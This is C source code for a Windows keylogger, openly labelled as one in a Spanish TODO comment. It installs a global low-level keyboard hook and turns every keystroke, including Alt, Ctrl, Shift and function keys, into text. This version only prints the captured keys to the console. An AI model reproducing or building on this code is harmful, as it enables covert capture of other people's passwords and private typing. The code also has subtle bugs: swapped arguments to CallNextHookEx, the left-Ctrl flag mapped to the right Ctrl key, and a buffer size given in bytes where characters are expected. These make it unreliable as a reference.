#include <stdio.h>
#include <string.h>
#include <windows.h>

HHOOK keyboardHook;

unsigned char lAlt = 0, rAlt = 0, ignoreLAlt = 0, ignoreRAlt = 0;
unsigned char lCtrl = 0, rCtrl = 0, ignoreLCtrl = 0, ignoreRCtrl = 0;
unsigned char lShift = 0, rShift = 0, ignoreLShift = 0, ignoreRShift = 0;

void processKey(const char* b) {
    printf("%s\n", b);
}

LRESULT CALLBACK hookCallback(int code, WPARAM wParam, LPARAM lParam) {
    if (code == HC_ACTION) {
        //TODO LO DEL KEYLOGGER AQUI
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            KBDLLHOOKSTRUCT* info = (KBDLLHOOKSTRUCT*) lParam;
            wchar_t wbuffer[6];
            char buffer[24], chr;
            int res = 0;
            if (info->vkCode == VK_LMENU) {
                lAlt = 1;
            } else if (info->vkCode == VK_RMENU) {
                rAlt = 1;
            } else if (info->vkCode == VK_LCONTROL) {
                lCtrl = 1;
            } else if (info->vkCode == VK_RCONTROL) {
                rCtrl = 1;
            } else if (info->vkCode == VK_LSHIFT) {
                lShift = 1;
            } else if (info->vkCode == VK_RSHIFT) {
                rShift = 1;
            }  else if (info->vkCode == VK_ESCAPE) {
                processKey("[ESCAPE]");
            } else if (info->vkCode == VK_RETURN) {
                processKey("[RETURN]");
            } else if (info->vkCode >= VK_F1 && info->vkCode <= VK_F24) {
                sprintf(buffer, "[F%d]", info->vkCode - VK_F1 + 1);
                res = 1;
            } else {
                BYTE keyboardState[256] = {0};
                if (lAlt) keyboardState[VK_LMENU] = 0x80;
                if (rAlt) keyboardState[VK_RMENU] = 0x80;
                if (lCtrl) keyboardState[VK_RCONTROL] = 0x80;
                if (rCtrl) keyboardState[VK_RCONTROL] = 0x80;
                if (lShift) keyboardState[VK_LSHIFT] = 0x80;
                if (rShift) keyboardState[VK_RSHIFT] = 0x80;
                keyboardState[VK_MENU] = keyboardState[VK_LMENU] | keyboardState[VK_RMENU];
                keyboardState[VK_CONTROL] = keyboardState[VK_LCONTROL] | keyboardState[VK_RCONTROL];
                keyboardState[VK_SHIFT] = keyboardState[VK_LSHIFT] | keyboardState[VK_RSHIFT];
                keyboardState[VK_CAPITAL] = GetKeyState(VK_CAPITAL) & 0x0001;
                keyboardState[info->vkCode] = 0x80;
                res = ToUnicode(info->vkCode, info->scanCode, keyboardState, wbuffer, sizeof(wbuffer), 5);
                if (res == 1) {
                    WideCharToMultiByte(CP_UTF8, 0, wbuffer, -1, buffer, sizeof(buffer), NULL, NULL);
                    ignoreLAlt = lAlt;
                    ignoreRAlt = rAlt;
                    ignoreLCtrl = lCtrl;
                    ignoreRCtrl = rCtrl;
                    ignoreLShift = lShift;
                    ignoreRShift = rShift;                
                } else {
                    info = (KBDLLHOOKSTRUCT*) lParam;
                    DWORD extend = 0;
                    switch (info->vkCode) {
                        case VK_LEFT: case VK_UP: case VK_RIGHT: case VK_DOWN:
                        case VK_PRIOR: case VK_NEXT:
                        case VK_END: case VK_HOME:
                        case VK_INSERT: case VK_DELETE:
                        case VK_DIVIDE:
                        case VK_NUMLOCK:
                            extend = 0x100; //Set extend bit
                            break;
                    }
                    if (GetKeyNameText((info->scanCode | extend) * 0x10000, buffer + 1, sizeof(buffer) - 1) > 0) {
                        res = 1;
                        buffer[0] = '[';
                        buffer[strlen(buffer)] = '\0';
                        buffer[strlen(buffer) - 1] = ']';
                    }
                }
            }
            if (res == 1) {
                processKey(buffer);
            }
        } else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
            KBDLLHOOKSTRUCT* info = (KBDLLHOOKSTRUCT*) lParam;
            if (info->vkCode == VK_LMENU) {
                if (!ignoreLAlt) processKey("[LALT]");
                ignoreLAlt = 0;
                lAlt = 0;
            }
            if (info->vkCode == VK_RMENU) {
                if (!ignoreRAlt) processKey("[RALT]");
                ignoreRAlt = 0;
                rAlt = 0;
            }
            if (info->vkCode == VK_LCONTROL) {
                if (!ignoreLCtrl) processKey("[LCONTROL]");
                ignoreLCtrl = 0;
                lCtrl = 0;
            }
            if (info->vkCode == VK_RCONTROL) {
                if (!ignoreRCtrl) processKey("[RCONTROL]");
                ignoreRCtrl = 0;
                rCtrl = 0;
            }
            if (info->vkCode == VK_LSHIFT) {
                if (!ignoreLShift) processKey("[LSHIFT]");
                ignoreLShift = 0;
                lShift = 0;
            }
            if (info->vkCode == VK_RSHIFT) {
                if (!ignoreRShift) processKey("[RSHIFT]");
                ignoreRShift = 0;
                rShift = 0;
            }
        }
    }
    return CallNextHookEx(keyboardHook, code, lParam, wParam);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, hookCallback, hInstance, 0);
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(keyboardHook);
    return 0;
}